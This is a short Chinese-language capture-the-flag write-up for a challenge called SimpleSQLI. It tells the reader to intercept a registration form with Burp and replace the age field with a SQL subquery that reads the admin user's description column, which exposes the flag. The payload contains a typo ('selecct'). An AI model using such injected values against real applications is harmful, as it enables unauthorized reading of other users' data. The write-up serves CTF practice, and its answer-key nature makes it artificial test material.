# Title
SimpleSQLI
# Steps
* Step1
注册用户；
* Step2
随便填写表单,然后用burp抓包，将age更改为`(select description from(selecct * from users where username=0x61646d696e)a)`
* Step3
查看源码，即可发现flag;
